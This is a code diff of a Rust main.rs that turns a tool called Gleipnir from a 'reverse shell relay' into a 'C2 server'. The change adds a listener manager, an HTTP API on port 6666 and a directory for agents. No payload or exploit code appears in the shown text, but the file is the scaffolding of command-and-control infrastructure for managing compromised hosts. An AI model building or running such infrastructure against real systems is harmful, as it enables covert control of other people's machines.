@@ -1,18 +1,25 @@
 mod api;
+mod http_api;
 mod listener;
 mod protocol;
 mod session;
+mod session_http;
+mod session_raw;
 mod socks;
+mod ws;
 
 use clap::Parser;
 use std::sync::Arc;
+use std::time::Instant;
 use tracing::info;
 
+use listener::{ListenerManager, ListenerMode};
 use session::SessionManager;
 use socks::SocksRelay;
+use ws::EventBus;
 
 #[derive(Parser)]
-#[command(name = "gleipnir-relay", about = "Gleipnir reverse shell relay")]
+#[command(name = "gleipnir-server", about = "Gleipnir C2 server")]
 struct Cli {
     #[arg(long, default_value = "0.0.0.0")]
     listen: String,
@@ -22,6 +29,9 @@ struct Cli {
 
     #[arg(long, default_value = "/tmp/gleipnir.sock")]
     api_socket: String,
+
+    #[arg(long, default_value_t = 6666)]
+    api_port: u16,
 
     /// TLS certificate file (PEM). When omitted, a self-signed cert is auto-generated.
     #[cfg(feature = "tls")]
@@ -37,6 +47,9 @@ struct Cli {
     #[cfg(feature = "tls")]
     #[arg(long)]
     no_tls: bool,
+
+    #[arg(long, default_value = "/opt/gleipnir/agents")]
+    agent_dir: String,
 }
 
 #[tokio::main]
@@ -44,7 +57,7 @@ async fn main() {
     tracing_subscriber::fmt()
         .with_env_filter(
             tracing_subscriber::EnvFilter::try_from_default_env()
-                .unwrap_or_else(|_| "gleipnir_relay=info".into()),
+                .unwrap_or_else(|_| "gleipnir_server=info".into()),
         )
         .init();
 
@@ -56,16 +69,11 @@ async fn main() {
     let cli = Cli::parse();
     let manager = Arc::new(SessionManager::new());
     let socks_relay = Arc::new(SocksRelay::new());
+    let started_at = Instant::now();
 
-    info!("gleipnir relay starting");
+    info!("gleipnir server starting");
 
-    let api_manager = manager.clone();
-    let api_socks = socks_relay.clone();
-    let api_socket = cli.api_socket.clone();
-    tokio::spawn(async move {
-        api::start(&api_socket, api_manager, api_socks).await;
-    });
-
+    // Resolve TLS config
     #[cfg(feature = "tls")]
     let tls_config = if cli.no_tls {
         info!("TLS disabled (--no-tls)");
@@ -90,12 +98,42 @@ async fn main() {
         }
     };
 
-    listener::start(
-        &cli.listen,
-        cli.port,
-        manager,
+    // Create the listener manager
+    let listener_manager = Arc::new(ListenerManager::new(
+        manager.clone(),
         #[cfg(feature = "tls")]
         tls_config,
-    )
-    .await;
+    ));
+
+    // Create the default listener on --port
+    listener_manager
+        .create(cli.port, ListenerMode::Agent, cli.listen.clone(), String::new())
+        .await
+        .unwrap_or_else(|e| panic!("failed to create default listener: {e}"));
+
+    // Unix socket API
+    let api_manager = manager.clone();
+    let api_socks = socks_relay.clone();
+    let api_socket = cli.api_socket.clone();
+    tokio::spawn(async move {
+        api::start(&api_socket, api_manager, api_socks).await;
+    });
+
+    let event_bus = Arc::new(EventBus::new());
+
+    // HTTP API (runs forever)
+    let agent_dir = if std::path::Path::new(&cli.agent_dir).exists() {
+        Some(cli.agent_dir.clone())
+    } else {
+        None
+    };
+    let http_state = http_api::AppState {
+        manager: manager.clone(),
+        socks_relay: socks_relay.clone(),
+        listener_manager: listener_manager.clone(),
+        event_bus,
+        started_at,
+        agent_dir,
+    };
+    http_api::start(cli.api_port, http_state).await;
 }
